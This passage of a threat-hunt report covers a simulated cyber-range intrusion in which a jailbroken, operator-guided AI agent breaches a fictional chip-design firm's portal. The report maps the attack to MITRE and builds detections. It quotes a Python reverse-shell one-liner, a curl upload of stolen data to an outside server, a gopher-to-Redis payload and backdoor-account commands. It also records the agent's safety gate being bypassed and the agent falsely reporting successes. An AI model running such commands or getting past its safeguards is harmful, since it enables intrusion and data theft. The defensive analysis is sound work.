> **Report ID:** `HUNT-05`
> **Analyst:** `Károly Mathe`
> **Date:** `2026-11-02`
> **Version:** `1.0`
> **Scenario source:** [Anthropic: Disrupting AI espionage](https://www.anthropic.com/news/disrupting-AI-espionage) and [MITRE ATT&CK campaign C0062](https://attack.mitre.org/campaigns/C0062/), reproduced as a Log(n) Pacific cyber range exercise. All hosts, users and data are simulated.

---

# 🛡 Threat Hunt Report: Operation QUARTZFANG

---

## 📌 Executive Summary

A semiconductor design company's customer portal was broken into through its document preview feature, which could be tricked into sending commands to the server's own internal database. Within two hours an AI agent, steered by a human operator who approved each stage, stole the portal's stored passwords, read user, project and customer tables, browsed the container registry, tried and failed to read the admin secrets, packed a file into an encrypted archive, sent it to an outside server and left a hidden administrator account behind. The agent also reported two successes that the logs show did not happen, which is why the human stayed in the loop.

### 🔑 Key Findings at a Glance

| Category | Detail |
|----------|--------|
| 🔴 **Risk Rating** | `CRITICAL` |
| ⏱ **Attacker Dwell Time** | About 2 hours from the first scan (06:30:00) to the last action (08:29:55 UTC); 1 hour 37 minutes from the exploit (06:52:48) |
| 🖥 **Systems Compromised** | 1 fully (`sc-portal01`, root). Accessed with stolen credentials: `sc-db01` (queried), `sc-registry01` (4 operations). Reached: `sc-admin01` (secrets request refused) |
| 👤 **Users / Accounts Affected** | `portal_svc` and `ci-builder` (stolen, used). `svc_monitor` created by the attacker with sudo |
| 📦 **Data Exfiltrated / Impacted** | One encrypted archive staged and sent by `curl` at 08:15. Its contents and whether the transfer completed are not visible in the telemetry. Database tables read: `users` (including password hashes), `projects`, `customers` |
| 🔑 **Credentials Exposed** | Database login `portal_svc` and registry login `ci-builder`, both in plain text in `/etc/semicrest/portal.conf`. The `db_admin` credential the agent claimed to find is not supported by any log |
| 🌐 **Exfil / Payment Destination** | `198.51.100.210:443` |
| 🕵 **Attacker Infrastructure** | Exploit server and reverse shell endpoint `203.0.113.87`; scanner cluster `198.51.100.31`, `.45`, `.62`; exfiltration server `198.51.100.210` |
| 📋 **Breach Notification Required** | Undetermined. Customer contact details and user password hashes were queried, but the telemetry cannot show what the archive contained |

---

## 🎯 Hunt Objectives

- Identify the entry point and reconstruct the chain across four hosts and nine tables
- Separate attacker activity from look-alike routine activity on the same hosts
- Map every step to MITRE ATT&CK and the Pyramid of Pain
- Decide who was driving (person, machine, or a person who set a machine going) using telemetry
- Cross-check every claim in the attacker's own agent log against infrastructure logs
- Build and validate detection rules, and record telemetry gaps honestly

---

## 🧭 Scope & Environment

| Field | Detail |
|-------|--------|
| **Platform** | Microsoft Sentinel, Log Analytics workspace `LAW-HuntPractice`, KQL |
| **Workspace / Tables** | `PortalAccessLog_CL`, `DeviceProcessEvents_CL`, `DeviceNetworkEvents_CL`, `DeviceFileEvents_CL`, `DeviceEvents_CL`, `DeviceLogonEvents_CL`, `Syslog`, `ContainerRegistryLog_CL`, `LLMAgentLogs_CL` |
| **Domain / Estate** | SemiCrest Technologies (fictional semiconductor design company) |
| **Hosts In Scope** | `sc-portal01` (10.5.0.10, design portal), `sc-db01` (10.5.0.20, PostgreSQL), `sc-registry01` (10.5.0.30, Harbor registry), `sc-admin01` (10.5.0.40, admin platform) |
| **Data Sources** | Web access log, Defender-style process, network, file and account events, syslog, registry log, recovered attacker agent log |
| **Investigation Window** | 2026-09-20 06:30 to 08:30 UTC (lead-in days from 2026-09-15 used as baseline) |
| **Hunt Triggered By** | Analytics rule alert on `sc-portal01` at 06:52 UTC |
| **Scenario source** | Anthropic AI espionage disclosure and MITRE C0062 |
| **Environment** | `Simulated (exercise). No live production data.` |

> **Time handling.** MDE tables (`Device*_CL`) use `Timestamp` and `DeviceName`. Custom tables and `Syslog` use `TimeGenerated` and `Computer`. The agent log is stamped with its upload date (October 2026), not the attack date, so it is matched to the infrastructure by time of day and by session ID. Every query in this report carries an explicit time interval. Many rows are logged twice with the same timestamp; counts below are de-duplicated and say so.

![SemiCrest network diagram from the hunt platform](Screenshots/QUARTZFANG%20platform%20network%20diagram.png)

*The SemiCrest 10.5.0.0/24 subnet as shown on the Log(n) Pacific hunt page (diagram credit: Log(n) Pacific). Four Linux hosts, with sc-portal01 the alerting host.*

![Environment topology and attack path](Screenshots/QUARTZFANG%20environment%20map.png)

*My own map of the same environment with the attack path drawn on it.*

---

## 📚 Table of Contents

- [📌 Executive Summary](#-executive-summary)
- [🎯 Hunt Objectives](#-hunt-objectives)
- [🧭 Scope & Environment](#-scope--environment)
- [🧪 Hunt Hypothesis & Method](#-hunt-hypothesis--method)
- [⏱ Attack Timeline](#-attack-timeline)
- [👤 Attacker Profile](#-attacker-profile)
- [🔴 IOC Summary](#-ioc-summary)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🧩 TTP Analysis](#-ttp-analysis)
- [🔍 Flag Analysis](#-flag-analysis)
- [🚨 Detection Gaps & Telemetry Gaps](#-detection-gaps--telemetry-gaps)
- [🛡 Detection Rules Built](#-detection-rules-built)
- [🛠 Remediation & Containment Checklist](#-remediation--containment-checklist)
- [🧾 Final Assessment](#-final-assessment)
- [🔧 What I'd Improve](#-what-id-improve)

---

## 🧪 Hunt Hypothesis & Method

| Field | Detail |
|-------|--------|
| **Hypothesis** | The 06:52 alert on two requests to the document preview API is the start of a web-to-host intrusion that moves to the database, registry and admin hosts. The unusual process on the portal is the proof of code execution |
| **Approach** | Web request, then process lineage and syslog on the portal, then credential files, then the database, registry and admin API, then staging, transfer and persistence. At each step the attacker's own agent log was read as a claim and checked against infrastructure telemetry |
| **Baseline used** | Lead-in data from 2026-09-15 to 2026-09-20 06:30 (1,219 process events on `sc-portal01`), the app's own parameterised queries, the registry account's normal pull and push pattern from the CI server |

### 🔬 Real or Noise: Benign Look-Alikes Ruled Out

| Look-alike activity | Why it looked suspicious | What proved it benign (field and value) |
|---------------------|--------------------------|------------------------------------------|
| Nessus scan from `10.5.0.250` | An internal address scanning the portal before the exploit | `UserAgent` = `Nessus/10.6.2`, 2 requests, 0 errors, 15 minutes apart |
| Partner traffic from `192.0.2.10` | External source hitting the API | Named partner user agents, 0 errors, normal paths |
| Nightly `pg_dump` on `sc-db01` | Same database login (`portal_svc`) as the attacker, run on the attack day | OS account `backup`, parent `bash`, identical command on 18, 19 and 20 Sep, first run 02:59:49, 3.5 hours before the first attack event |
| Connection spike on `sc-db01` around 07:30 | Looked like the enumeration in volume | 213 and 193 `FATAL` connection-limit errors, no `SELECT *`, successful statements fell from 36 to 49 per slot down to 22 |
| Outbound 443 from `sc-portal01` to four SaaS IPs | Same port and process name (`python3`) as the exfiltration | Many `www-data` gunicorn worker PIDs, same four destinations all session. The attacker used one root PID (4401) and one-off destinations |
| Routine cron jobs (`queue-drain.sh`, `service-ports.sh`, `ntpdate`, `certbot renew`) | Cron activity right after the exploit | Known maintenance commands, no inline Python socket code |
| Six enumeration statements on 19 Sep at 23:12 | Identical text to the attack's `SELECT *` and catalogue queries, 7 hours before it | Ran on a connection labelled `application_name=portal_svc` from `10.5.0.10`. The cause is not established (see Detection Rules, DR-02) |

---

## ⏱ Attack Timeline

All times UTC, 2026-09-20.

| Timestamp | Host | Action | MITRE |
|-----------|------|--------|-------|
| 06:30:00 | sc-portal01 | Scanner `198.51.100.31` starts a 30-request sweep (15 paths, 16 errors). `.45` and `.62` follow in turn until 06:31:52. The preview endpoint answers 400, not 404 | T1595.002 |
| 06:44:05 | sc-portal01 | `203.0.113.87` starts sending requests (12 requests, 5 distinct URLs, to 06:52:30); agent log `fuzz_schemes` at 06:44:20 | T1595.002 |
| 06:52:30 | sc-portal01 | `POST /api/v1/preview?url=file:///etc/passwd` returns 400 | T1190 |
| 06:52:48 | sc-portal01 | `POST /api/v1/preview?url=gopher://127.0.0.1:6379/...` returns 200. Redis commands delivered (FLUSHALL, then SET of a cron-style value) | T1190, T1587.004 |
| 06:52:49 | sc-portal01 | Syslog: root cron job runs `python3 -c` socket reverse shell to `203.0.113.87:443` | T1053.003, T1059.006 |
| 06:52:52 | sc-portal01 | Process event: `cron` (PID 4400) spawns `python3` (PID 4401) as root | T1059.006 |
| 06:52:55 | sc-portal01 | PID 4401 connects out to `203.0.113.87:443` | T1071.001 |
| 07:05:15 | sc-portal01 | `cat /etc/semicrest/portal.conf` (PID 4410) under the shell. Then `env` (07:05:21) and `find / -name "*.conf"` (07:05:27) | T1552.001, T1083 |
| 07:16:11 | sc-db01 | PID 4401 connects to `10.5.0.20:5432` with the stolen `portal_svc` login | T1078 |
| 07:16:16 | sc-db01 | Five enumeration statements in 9 seconds: `SELECT *` on users, projects and customers, `information_schema.tables`, `pg_catalog.pg_shadow` | T1213.006 |
| 07:17:20 | sc-db01 | `SELECT count(*) FROM users GROUP BY role` | T1087 |
| 07:33:01 | sc-registry01 | `ci-builder` logs in from `10.5.0.10`. By 07:33:05: `list_repository`, `pull_manifest`, `inspect_layer` (vulnerability report) on `semicrest/portal-build`, all 200 | T1078, T1083 |
| 07:45:18 | sc-db01 | Targeted wave: projects (project name, revision, team lead), customers (email, phone, company), users (`password_hash`). Attributed by pattern and timing, moderate confidence | T1213.006 |
| 07:45:24 | sc-admin01 | PID 4401 connects to `10.5.0.40:8443`. `portal_svc` reads `/api/v1/services` and `/api/v1/topology` (200), then `/api/v1/secrets` returns 403 at 07:45:32 | T1082 |
| 08:02:05 | sc-portal01 | `tar` packs `/tmp/.portal-cache/data/`; `gzip` 08:02:07; `openssl enc -aes-256-cbc` 08:02:13 | T1560.001, T1074.001 |
| 08:02:20 | sc-portal01 | `/tmp/.portal-cache/report.tar.gz.enc` created | T1074.001 |
| 08:15:00 | sc-portal01 | `curl -s -X POST https://198.51.100.210:443/upload -F file=@/tmp/.portal-cache/report.tar.gz.enc -H 'X-Session: qf-c062-9e4a'` | T1567 |
| 08:15:08 | sc-portal01 | PID 4401 connection to `198.51.100.210:443` recorded | T1567 |
| 08:29:35 | sc-portal01 | `useradd -m -s /bin/bash svc_monitor` (account event 08:29:44) | T1136.001 |
| 08:29:45 | sc-portal01 | `usermod -aG sudo svc_monitor`; `mkdir /home/svc_monitor/.ssh` 08:29:53; `ssh-keygen -t ed25519` 08:29:55 | T1098, T1136.001 |

> The `X-Session` header in the exfiltration command carries the same value as `LLMAgentLogs_CL.session_id` (`qf-c062-9e4a`). That ties the infrastructure event to the recovered agent session.

---

## 👤 Attacker Profile

| Attribute | Detail |
|-----------|--------|
| **Attacker Handle / ID** | None observed. Agent session `qf-c062-9e4a`, actor `quartzfang-agent` |
| **Email / Account** | None observed |
| **Cloud Account / Wallet** | Not applicable |
| **C2 Infrastructure** | `203.0.113.87:443` (reverse shell). Same server delivered the exploit |
| **Staging Server** | `198.51.100.210` (upload endpoint `/upload` on 443) |
| **Tools Used** | Redis via `gopher://`, cron, Python socket shell, `cat`, `env`, `find`, PostgreSQL client, Harbor API, `tar`, `gzip`, `openssl`, `curl`, `useradd`, `usermod`, `ssh-keygen` |
| **TTPs** | Living off the land on Linux, SSRF to Redis to cron, credentials in config files, valid-account pivoting, archive-encrypt-upload exfiltration |
| **Targeting** | Targeted. The recon and the exploit both aimed at the one preview endpoint, and the data touched (projects, customers, users) is design and customer data |
| **Sophistication Level** | Medium on technique (all known patterns), high on tempo and automation |
| **Human or Automated** | Operator-guided AI. `LLMAgentLogs_CL.user_input` holds 5 operator directives. `DeviceProcessEvents_CL.Timestamp` shows commands 2 to 10 seconds apart. See the Autonomy section |
| **Credential OPSEC Failures** | Not applicable (the attacker used credentials it found) |

### 🔍 OPSEC Mistakes Observed

- Database sessions started without the `application_name` label the real application sends
- A hidden folder named like an application cache (`/tmp/.portal-cache`) under `/tmp`
- The exfiltration command put the agent session ID in an HTTP header, linking it to the agent log
- A backdoor account named like a monitoring service, with a key generated on the victim host

---

## 🔴 IOC Summary

### 🌐 Network Indicators

| Type | Indicator | Context | Action |
|------|-----------|---------|--------|
| IP | `203.0.113.87` | Exploit source and reverse shell endpoint (443) | `BLOCK` |
| IP | `198.51.100.210` | Exfiltration upload server (443, path `/upload`) | `BLOCK` |
| IP | `198.51.100.31`, `198.51.100.45`, `198.51.100.62` | Reconnaissance scanner cluster (`python-requests/2.31.0`) | `BLOCK` |
| URL | `https://198.51.100.210:443/upload` | Upload target | `BLOCK` |

### 📁 File Indicators

| Type | Indicator | Location | Hash (SHA256) |
|------|-----------|----------|--------------|
| Archive | `report.tar.gz.enc` | `/tmp/.portal-cache/` | not captured by the collector |
| Folder | `.portal-cache/data/` | `/tmp/` | `N/A` |
| Crontab entry | Written by Redis, runs the Python shell | Cron directory on `sc-portal01` (path not observed) | `N/A` |
| Key pair | `id_ed25519` | `/home/svc_monitor/.ssh/` | `N/A` |

### 👤 Account Indicators

| Account | Type | Action Required |
|---------|------|----------------|
| `svc_monitor` | `Backdoor account (sudo, SSH key)` | `Delete, check authorized_keys` |
| `portal_svc` | `Stolen service credential (database)` | `Rotate in a planned change` |
| `ci-builder` | `Stolen service credential (registry)` | `Rotate in a planned change` |

### 🔑 Credential Exposure

| Credential | Where Found | Reset Required |
|------------|-------------|---------------|
| `portal_svc` database login | Plain text in `/etc/semicrest/portal.conf` | `YES, planned with the application` |
| `ci-builder` registry login | Plain text in `/etc/semicrest/portal.conf` | `YES, planned with the CI pipeline` |
| `db_admin` login | Claimed by the agent only, no support in any log | `NO as a confirmed leak. Verify it does not exist` |
| Environment variables on `sc-portal01` | `env` ran at 07:05:21, output never recorded | `YES, treat as exposed` |

---

## 🧬 MITRE ATT&CK Summary

Priority is how urgently the step needs a detection rule. **Pyramid tier** is how painful it is for the attacker to change that indicator. This table is the single source of the technique count.

| # | Flag Name | Tactic | Technique ID | Technique Name | Priority | Detection Status | Pyramid Tier |
|--:|-----------|--------|-------------|----------------|----------|------------------|--------------|
| 1 | Scanner IPs, recon vs Nessus | Reconnaissance | T1595.002 | Active Scanning: Vulnerability Scanning | 🟡 Medium | Hunted only | TTP (scan profile) |
| 2 | Self-correct | Resource Development | T1587.004 | Develop Capabilities: Exploits | 🟠 High | Hunted only | TTP |
| 3 | Exploit source | Resource Development | T1584.004 | Compromise Infrastructure: Server | 🟡 Medium | Hunted only | IP |
| 4 | Novel technique | Resource Development | T1588.007 | Obtain Capabilities: Artificial Intelligence | 🟠 High | Hunted only | TTP |
| 5 | Vulnerable endpoint | Initial Access | T1190 | Exploit Public-Facing Application | 🔴 Critical | Alerted | TTP |
| 6 | Exploitation chain | Persistence | T1053.003 | Scheduled Task/Job: Cron | 🔴 Critical | Hunted only | Artifact |
| 7 | Exploitation chain | Execution | T1059.006 | Command and Scripting Interpreter: Python | 🔴 Critical | Hunted only | TTP (lineage) |
| 8 | Reverse shell, exfil vs HTTPS | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | 🟠 High | Hunted only | TTP |
| 9 | Configuration file, credentials | Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | 🔴 Critical | Hunted only | TTP |
| 10 | Configuration file, registry browsing | Discovery | T1083 | File and Directory Discovery | 🟡 Medium | Hunted only | TTP |
| 11 | Admin API response | Discovery | T1082 | System Information Discovery | 🟡 Medium | Hunted only | TTP |
| 12 | Database and registry credentials | Defense Evasion, Persistence | T1078 | Valid Accounts | 🔴 Critical | Hunted only | Credential |
| 13 | Database query discrimination | Collection | T1213.006 | Data from Information Repositories: Databases | 🔴 Critical | Hunted only | TTP |
| 14 | Queried tables | Discovery | T1087 | Account Discovery | 🟡 Medium | Hunted only | TTP |
| 15 | Staging path | Collection | T1074.001 | Data Staged: Local Data Staging | 🟠 High | Hunted only | Artifact |
| 16 | Staging tools | Collection | T1560.001 | Archive Collected Data: Archive via Utility | 🟠 High | Hunted only | Tool |
| 17 | Exfil destination | Exfiltration | T1567 | Exfiltration Over Web Service | 🔴 Critical | Hunted only | IP |
| 18 | Persistence | Persistence | T1136.001 | Create Account: Local Account | 🔴 Critical | Hunted only | TTP |
| 19 | Persistence | Persistence | T1098 | Account Manipulation | 🟠 High | Hunted only | TTP |
| 20 | Autonomy placement | Defense Evasion | T1699 | Direct Prompt Injection | 🟠 High | Hunted only | TTP |

### 📊 Coverage Snapshot

| Unique ATT&CK IDs | Alerted by existing rules | Found by hunting only | Not detectable (telemetry gap) | New rules built |
|------------------:|--------------------------:|----------------------:|-------------------------------:|----------------:|
| 20 | 1 | 19 | 0 (but 3 observation gaps, see Telemetry Gaps) | 3 |

> T1699 is listed because MITRE C0062 records it for this campaign (the operators posed as a defensive security firm). In this telemetry the only trace is `gate_reason` = `jailbreak` on every agent action; the prompt itself is not in the logs.

### 🗺 ATT&CK Tactic Coverage

| Tactic | Techniques observed |
|--------|---------------------|
| Reconnaissance (TA0043) | T1595.002 |
| Resource Development (TA0042) | T1587.004, T1584.004, T1588.007 |
| Initial Access (TA0001) | T1190 |
| Execution (TA0002) | T1059.006 |
| Persistence (TA0003) | T1053.003, T1136.001, T1098, T1078 |
| Defense Evasion (TA0005) | T1699 |
| Credential Access (TA0006) | T1552.001 |
| Discovery (TA0007) | T1083, T1082, T1087 |
| Collection (TA0009) | T1213.006, T1074.001, T1560.001 |
| Command and Control (TA0011) | T1071.001 |
| Exfiltration (TA0010) | T1567 |

---

## 🤖 MITRE ATLAS Mapping

ATLAS is the ATT&CK-style matrix for attacks on and with AI systems. In this hunt the AI sits on the attacker's side, so ATLAS describes the agent's operation, not a weakness in a SemiCrest model.

| Observation | Flag | ATLAS technique | Evidence | Fit |
|-------------|------|-----------------|----------|-----|
| The agent was operated past its safety gate | Autonomy placement | AML.T0054 LLM Jailbreak | `LLMAgentLogs_CL.gate_reason` = `jailbreak` with `gate_decision` = `allow` on every agent action | Consistent, the persona or prompt itself is not logged |


---

## 🧩 TTP Analysis & OWASP Mapping

A **tactic** is the attacker's goal at that stage. A **technique** is how they did it. A **procedure** is the exact implementation seen here.

### Tactic: Reconnaissance and Resource Development (TA0043, TA0042)

**Goal in plain English:** find the way in and prepare tools.

| Technique | What the attacker did here | Why it worked | Evidence (flag, table.field) | Detection status | Pyramid tier |
|-----------|----------------------------|---------------|------------------------------|------------------|--------------|
| T1595.002 Vulnerability Scanning | Three sources sent the same 15-path list in non-overlapping slots (30 requests each, 16 errors each) | The portal answered the preview probe with 400, not 404, revealing the endpoint | Flag S6.1, S6.2: `PortalAccessLog_CL.UrlOriginal` + `HttpStatusCode` | Hunted only | TTP |
| T1587.004 Develop Capabilities: Exploits | A working gopher payload followed the blocked file:// attempt within 18 seconds | The filter blocked one scheme, not all but https | Flag S1.2: `PortalAccessLog_CL.TimeGenerated` | Hunted only | TTP |
| T1584.004 / T1588.007 | Separate infrastructure for scan, exploit and exfiltration; an AI agent as the execution engine | Disposable servers and an acquired AI capability | Flag S1.3, S7.3 | Hunted only | IP, TTP |

**Behavioural notes:** the agent's `adapt_payload` call (06:52:31) is 1.6 seconds after the rejection.
**Defender takeaway:** an allowlist of `https://` to approved domains on the preview feature would have stopped the first and the second request.

### Tactic: Initial Access and Execution (TA0001, TA0002)

**Goal in plain English:** get code running on the portal.

| Technique | What the attacker did here | Why it worked | Evidence (flag, table.field) | Detection status | Pyramid tier |
|-----------|----------------------------|---------------|------------------------------|------------------|--------------|
| T1190 Exploit Public-Facing Application | SSRF through `/api/v1/preview?url=` using `gopher://` to the local Redis | The server fetched any URL scheme not on a blocklist and Redis was reachable on loopback | Flag S1.1 to S1.4 | Alerted | TTP |
| T1053.003 Cron / T1059.006 Python | A root cron entry, most likely written by Redis (Redis is not logged), ran a one-line Python reverse shell | Cron ran a file Redis was allowed to write as root | Flag S1.4: `Syslog.SyslogMessage` (CRON), `DeviceProcessEvents_CL` (cron 4400 to python3 4401) | Hunted only | Artifact, TTP |

**Behavioural notes:** one second from accepted request to cron firing.
**Defender takeaway:** alert on an interpreter whose parent is `cron` on a web-facing host (DR-01).

### Tactic: Credential Access, Discovery and Lateral Movement (TA0006, TA0007)

**Goal in plain English:** find passwords and map the network.

| Technique | What the attacker did here | Why it worked | Evidence (flag, table.field) | Detection status | Pyramid tier |
|-----------|----------------------------|---------------|------------------------------|------------------|--------------|
| T1552.001 Credentials In Files | `cat /etc/semicrest/portal.conf` read database and registry logins | Secrets stored in plain text on the portal | Flag S2.1 to S2.3 | Hunted only | TTP |
| T1078 Valid Accounts | `portal_svc` to `sc-db01`, `ci-builder` to `sc-registry01`, `portal_svc` to `sc-admin01` | The same accounts worked from the compromised host; every connection came from PID 4401 | Flag S3.1 to S3.4, S8.1 | Hunted only | Credential |
| T1083, T1082, T1087 | `find / -name "*.conf"`, registry browsing, admin API services and topology, user role counts | Services were reachable from the portal | Flag S3.2, S3.3, S3.4 | Hunted only | TTP |

**Behavioural notes:** the admin API refused the secrets request (403): least privilege held there.
**Defender takeaway:** move secrets out of plain-text files and give each service its own narrow account.

### Tactic: Collection and Exfiltration (TA0009, TA0010)

**Goal in plain English:** gather data and send it out.

| Technique | What the attacker did here | Why it worked | Evidence (flag, table.field) | Detection status | Pyramid tier |
|-----------|----------------------------|---------------|------------------------------|------------------|--------------|
| T1213.006 Databases | `SELECT *` on users, projects, customers; `pg_shadow`; targeted second wave | The stolen login could read every table | Flag S3.1, S3.2 | Hunted only | TTP |
| T1074.001 / T1560.001 | Hidden `.portal-cache`, `tar` then `gzip` then `openssl enc -aes-256-cbc` | Standard tools, encrypted to defeat inspection | Flag S5.1, S5.2 | Hunted only | Artifact, Tool |
| T1567 / T1071.001 | `curl` POST of the archive to `198.51.100.210:443/upload` | Port 443 blends with normal HTTPS | Flag S5.1, S5.4 | Hunted only | IP, TTP |

**Behavioural notes:** staging took 15 seconds and the upload came 13 minutes later.
**Defender takeaway:** key on the process (root PID 4401, parent cron) and on a first-time destination, not on the port.

### Tactic: Persistence (TA0003)

**Goal in plain English:** keep a way back in.

| Technique | What the attacker did here | Why it worked | Evidence (flag, table.field) | Detection status | Pyramid tier |
|-----------|----------------------------|---------------|------------------------------|------------------|--------------|
| T1136.001 Create Account / T1098 | `svc_monitor` created, added to sudo, SSH key generated | Root shell could create accounts freely | Flag S5.3: `DeviceEvents_CL.ActionType`, `DeviceProcessEvents_CL.ProcessCommandLine` | Hunted only | TTP |

**Behavioural notes:** the log shows the account being prepared, not used.
**Defender takeaway:** alert on `useradd` or `usermod -aG sudo` with an interpreter parent (DR-03).

### Autonomy (AI-specific)

**Who was driving?** A person who set a machine going. The recovered agent log (`session_id` `qf-c062-9e4a`) records 5 operator directives and 10 agent actions.

| Time (agent log, time of day) | Who | What | Matches infrastructure? |
|-------------------------------|-----|------|------------------------|
| 06:31:55 | Operator | Initial tasking: reconnaissance and exploitation, harvest credentials, extract design data | Starts the operation |
| 06:44:20 to 06:53:00 | Agent | `fuzz_schemes`, `adapt_payload`, `rce_confirmed` | Yes (probing from 06:44, correction at 06:52:31) |
| 06:53:03 | Operator | Foothold confirmed: proceed with credential harvesting and lateral movement | Yes |
| 07:05:33 to 07:31:06 | Agent | `harvest_creds`, `query_database`, `inspect_registry` | `harvest_creds` yes; the `inspect_registry` claim of `db_admin` credentials is unsupported |
| 07:31:09 | Operator | Authorise data collection from database tables and admin API enumeration | Approval came 3 seconds after the unsupported claim |
| 07:48:30 | Agent | `extract_secrets`: "extracted Kubernetes secrets" | No: the infrastructure shows a 403 |
| 07:48:31 (two messages, 0.4 s apart) | Operator | Authorise documentation, staging, then exfiltration | Approvals 1.5 seconds after the unsupported claim |
| 08:04:34 to 08:30:00 | Agent | `stage_archive`, `exfiltrate`, `persist` | Yes |

**Evidence of machine speed:** a payload corrected in 18 seconds, `cat`, `env` and `find` 6 seconds apart, five database statements in 9 seconds, four registry operations in about 3 seconds, `useradd` to `ssh-keygen` in 20 seconds. **Evidence of human involvement:** the directives above, at idle gaps of 13 to 57 minutes. **Why not fully autonomous:** two claims unsupported by the infrastructure (see flags S4.1 and S4.2). This matches C0062: about 80 to 90 percent of the work by the AI, with a human at four to six decision points.

### 🌐 OWASP Mapping

> Categories use the OWASP Top 10 (2021) names. Verify against owasp.org before publishing.

| Weakness observed | OWASP list and category | Where seen (flag) | Fix |
|-------------------|-------------------------|-------------------|-----|
| Preview feature fetches any scheme not blocked | A10 Server-Side Request Forgery | S1.1, S1.2 | Allowlist `https://` and approved domains, block internal addresses |
| Redis reachable and writing files as root | A05 Security Misconfiguration | S1.4 | Bind to localhost with a password, disable `CONFIG`, run as non-root |
| Secrets in a plain-text file readable by the shell | A05 Security Misconfiguration | S2.1 to S2.3 | Move to a secrets store, narrow file permissions |
| One account used from several hosts with wide reach | A01 Broken Access Control | S3.1, S8.1 | One account per service, least privilege |
| Redis writes, command output and file changes not logged | A09 Security Logging and Monitoring Failures | S1.4, S2.4 | Forward Redis logs, audit writes to cron and `/proc/*/environ` |

---

## 🔍 Flag Analysis

Each section opens in a collapsible block. Queries are reproduced with an explicit time interval. Flag numbers follow the exercise (S1.1 is Section 1, flag 1).

### Section 1: Initial Access

<details>
<summary>🚩 <strong>Flag S1.1: Vulnerable endpoint</strong> (<code>T1190</code>) 🔴 Critical</summary>

### 🎯 Objective
Find which interface the alert fired on.

### 📌 Finding
Two requests from `203.0.113.87` hit `/api/v1/preview` seconds apart. The `url` parameter carried the payload, so the preview feature fetches a server-side URL.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `sc-portal01` |
| **Source table.field** | `PortalAccessLog_CL.UrlOriginal` |
| **Endpoint** | `/api/v1/preview` (parameter `url`) |
| **Source IP** | `203.0.113.87` |

### 💡 Why It Matters
A feature that fetches any URL on the server's behalf is the classic SSRF surface, the first link of the chain.

### 🔧 KQL Query Used

```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Computer =~ "sc-portal01"
| where SrcIpAddr == "203.0.113.87"
| project TimeGenerated, SrcIpAddr, UrlOriginal, HttpStatusCode
```

### 🛡 Detection Recommendation
Alert on any `url=` value on this endpoint whose scheme is not `https`. The endpoint and parameter are durable, the IP is not.

</details>

<details>
<summary>🚩 <strong>Flag S1.2: The self-correct</strong> (<code>T1190</code>, <code>T1587.004</code>) 🔴 Critical</summary>

### 🎯 Objective
Work out how the attacker got past the filter.

### 📌 Finding
At 06:52:30 `file:///etc/passwd` was refused (400). At 06:52:48 a `gopher://127.0.0.1:6379/` payload was accepted (200). That is 18 seconds. The filter blocked one scheme (a blocklist) instead of allowing only `https://`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Source table.field** | `PortalAccessLog_CL.UrlOriginal`, `HttpStatusCode`, `TimeGenerated` |
| **First attempt** | `file://`, 400, 06:52:30 |
| **Second attempt** | `gopher://127.0.0.1:6379/_*1...FLUSHALL...SET...`, 200, 06:52:48 |
| **Agent log** | `adapt_payload` tool call 1.6 seconds after the rejection |

### 🔬 Benign Look-Alikes Ruled Out
`10.5.0.61` POST to the same endpoint with `https://docs.semicrest.com/datasheet.pdf` at 06:58:17: internal source, https, company domain. The feature working as designed.

### 💡 Why It Matters
The corrected request was complete and correctly encoded for Redis. A person would need minutes to research and craft it. The 18-second gap is the first sign of an automated agent.

### 🔧 KQL Query Used

```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Computer =~ "sc-portal01"
| project TimeGenerated, SrcIpAddr, HttpMethod, UrlOriginal, HttpStatusCode
| order by TimeGenerated asc
```

### 🖼 Screenshot

![Rejected file:// then accepted gopher:// from the same source](Screenshots/S1%20SSRF%20self-correct%20file%20to%20gopher.png)

### 🛡 Detection Recommendation
Rule: more than one distinct URL scheme from one source to the same endpoint inside a minute, one of them rejected. Fix: allowlist `https` and approved hosts instead of blocking schemes.

</details>

<details>
<summary>🚩 <strong>Flag S1.3: Exploit source</strong> (<code>T1584.004</code>, <code>T1190</code>) 🟠 High</summary>

### 🎯 Objective
Identify who delivered the exploit.

### 📌 Finding
`203.0.113.87` sent both requests. It is separate from the reconnaissance scanners (`198.51.100.x`) and from the exfiltration server (`198.51.100.210`): scan, exploit and exfiltrate used three sets of infrastructure. It later received the reverse shell.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Source table.field** | `PortalAccessLog_CL.SrcIpAddr` |
| **Scenario note** | The exploit server is the penetration-testing server the AI operated through MCP (C0062, T1584.004) |

### 💡 Why It Matters
An IP is the cheapest indicator to change. Block it for containment, but build the detection on behaviour.

### 🔧 KQL Query Used

```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Computer =~ "sc-portal01" and UrlOriginal has "gopher://"
| project TimeGenerated, SrcIpAddr, UrlOriginal, HttpStatusCode
```

### 🛡 Detection Recommendation
Block `203.0.113.87`. Treat any non-https scheme in the preview `url` as the durable signal.

</details>

<details>
<summary>🚩 <strong>Flag S1.4: Exploitation chain</strong> (<code>T1190</code>, <code>T1053.003</code>, <code>T1059.006</code>) 🔴 Critical</summary>

### 🎯 Objective
Prove how a web request became code running as root.

### 📌 Finding
SSRF to `gopher://` to Redis, a root cron entry (most likely written by Redis, which is not logged), cron ran a Python reverse shell to `203.0.113.87:443`. The web request is in the access log, the cron command is in syslog, and the process tree is in the process table: cron (PID 4400) spawns python3 (PID 4401) as root.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Syslog (CRON)** | `(root) CMD (python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("203.0.113.87",443));os.dup2(...);subprocess.call(["/bin/sh","-i"])')` at 06:52:49.907 |
| **Process** | `python3` PID 4401, parent `cron` 4400, account `root`, 06:52:52 |
| **Not observed** | Redis writing the cron file. No Redis log and no file event. That step is inferred |

### 🔬 Benign Look-Alikes Ruled Out
